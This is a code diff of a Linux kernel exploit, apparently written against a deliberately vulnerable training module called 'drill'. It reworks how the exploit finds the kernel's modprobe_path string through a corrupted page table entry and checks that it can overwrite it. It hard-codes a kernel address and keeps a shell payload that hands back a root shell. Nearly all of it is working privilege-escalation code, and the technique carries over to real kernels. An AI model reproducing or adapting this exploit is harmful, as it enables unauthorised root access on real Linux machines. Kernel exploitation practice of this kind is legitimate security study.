@@ -29,6 +29,7 @@
 #include <sys/mman.h>
 #include <sys/socket.h>
 #include <linux/if_alg.h>
+#include <linux/limits.h>
 #include "drill.h"
 
 int do_cpu_pinning(void)
@@ -149,38 +150,12 @@ int prepare_page_tables(void)
 	return EXIT_SUCCESS;
 }
 
-/* Update the address of modprobe_path for your kernel: */
-#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
-#define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)
-
-#define KMOD_PATH_LEN 256 /* default */
 #define FLUSH_STAT_INPROGRESS 0
 #define FLUSH_STAT_DONE 1
 #define SLEEPLOCK(cmp)             \
 	while (cmp) {              \
 		usleep(10 * 1000); \
 	}
-
-static long get_modprobe_path(char *buf, size_t buflen)
-{
-	int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
-	if (fd < 0) {
-		perror("[-] open");
-		return EXIT_FAILURE;
-	}
-
-	ssize_t bytes = read(fd, buf, buflen - 1);
-	close(fd);
-
-	if (bytes < 0) {
-		perror("[-] read");
-		return EXIT_FAILURE;
-	}
-	buf[bytes - 1] = '\x00'; /* cleanup line end */
-
-	printf("[+] current modprobe path: %s\n", buf);
-	return 0;
-}
 
 /* The exploit can work without it, but will be less reliable */
 static void flush_tlb(void *addr, size_t len)
@@ -202,38 +177,82 @@ static void flush_tlb(void *addr, size_t len)
 	munmap(status, sizeof(short));
 }
 
-static int strcmp_modprobe_path(char *new_str)
-{
-	int ret;
-	char buf[KMOD_PATH_LEN] = { '\x00' };
+/* Update the address of modprobe_path for your kernel: */
+#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
+#define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)
 
-	ret = get_modprobe_path(buf, KMOD_PATH_LEN);
-	if (ret != 0) {
+int get_modprobe_path(char *buf)
+{
+	int fd = -1;
+	ssize_t bytes = 0;
+	int ret = EXIT_FAILURE;
+
+	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
+	if (fd < 0) {
+		perror("[-] open modprobe");
 		return EXIT_FAILURE;
 	}
 
-	return strncmp(new_str, buf, KMOD_PATH_LEN);
+	bytes = read(fd, buf, PATH_MAX);
+	buf[PATH_MAX - 1] = 0;
+
+	ret = close(fd);
+	if (ret != 0)
+		perror("[-] close modprobe");
+
+	if (bytes < 0) {
+		perror("[-] read modprobe");
+		return EXIT_FAILURE;
+	}
+
+	return EXIT_SUCCESS;
 }
 
-/* check whether address contains modprobe */
-void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str,
-			   size_t modprobe_path_len)
+void *memmem_modprobe_path(void *memory, size_t memory_size)
 {
-	void *modprobe_addr;
-	modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
+	int ret = EXIT_FAILURE;
+	char modprobe_path[PATH_MAX] = { 0 };
+	size_t modprobe_path_len = 0;
+	char *modprobe_path_uaddr = NULL;
+	char new_modprobe_path[PATH_MAX] = { 0 };
 
-	if (modprobe_addr == NULL)
+	ret = get_modprobe_path(modprobe_path);
+	if (ret == EXIT_FAILURE)
 		return NULL;
-	printf("[+] found modprobe candidate, rewriting to check if it is false positive\n");
 
-	/* check for modprobe overwriting by reading /proc/sys/kernel/modprobe */
-	strcpy(modprobe_addr, "/sanitycheck");
-	if (strcmp_modprobe_path("/sanitycheck") != 0) {
-		printf("[-] ^modprobe_path not overwritten!\n");
+	modprobe_path_len = strlen(modprobe_path);
+
+	printf("[+] current modprobe_path: \"%s\"\n", modprobe_path);
+	if (modprobe_path[0] != '/' || modprobe_path[modprobe_path_len - 1] != '\n') {
+		printf("[-] unexpected modprobe_path\n");
 		return NULL;
 	}
 
-	return modprobe_addr;
+	modprobe_path_len--; /* Skip line feed '\n' */
+	modprobe_path_uaddr = memmem(memory, memory_size, modprobe_path, modprobe_path_len);
+	if (modprobe_path_uaddr == NULL) {
+		printf("[-] modprobe_path is not found in memory pointed by corrupted PTE\n");
+		return NULL;
+	}
+	printf("[+] found modprobe_path in memory pointed by corrupted PTE\n");
+
+	/* Test overwriting modprobe_path */
+	modprobe_path_uaddr[0] = 'x';
+
+	ret = get_modprobe_path(new_modprobe_path);
+	if (ret == EXIT_FAILURE)
+		return NULL;
+
+	if (new_modprobe_path[0] != 'x') {
+		printf("[-] testing modprobe_path overwriting failed\n");
+		return NULL;
+	}
+
+	/* Return the initial value back for now */
+	modprobe_path_uaddr[0] = '/';
+
+	printf("[+] testing modprobe_path overwriting succeeded\n");
+	return modprobe_path_uaddr;
 }
 
 #define PAYLOAD "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"
@@ -294,8 +313,6 @@ int main(void)
 	long current_n = 0;
 	long reserved_from_n = 0;
 	long uaf_n = 0;
-	char modprobe_path[KMOD_PATH_LEN] = { 0 };
-	size_t modprobe_path_len = 0;
 	void *modprobe_addr;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
@@ -303,11 +320,6 @@ int main(void)
 	ret = prepare_page_tables();
 	if (ret == EXIT_FAILURE)
 		goto end;
-
-	ret = get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
-	if (ret == EXIT_FAILURE)
-		goto end;
-	modprobe_path_len = strlen(modprobe_path);
 
 	act_fd = open("/proc/drill_act", O_WRONLY);
 	if (act_fd < 0) {
@@ -412,8 +424,7 @@ int main(void)
 		unsigned int value = *ptr;
 
 		if (value != 0xcafecafe) {
-			modprobe_addr = memmem_modprobe_path(virt_address, PAGE_SIZE, modprobe_path,
-							     modprobe_path_len);
+			modprobe_addr = memmem_modprobe_path(virt_address, PAGE_SIZE);
 
 			if (modprobe_addr != NULL) {
 				printf("[+] success, userspace modprobe address %p\n",
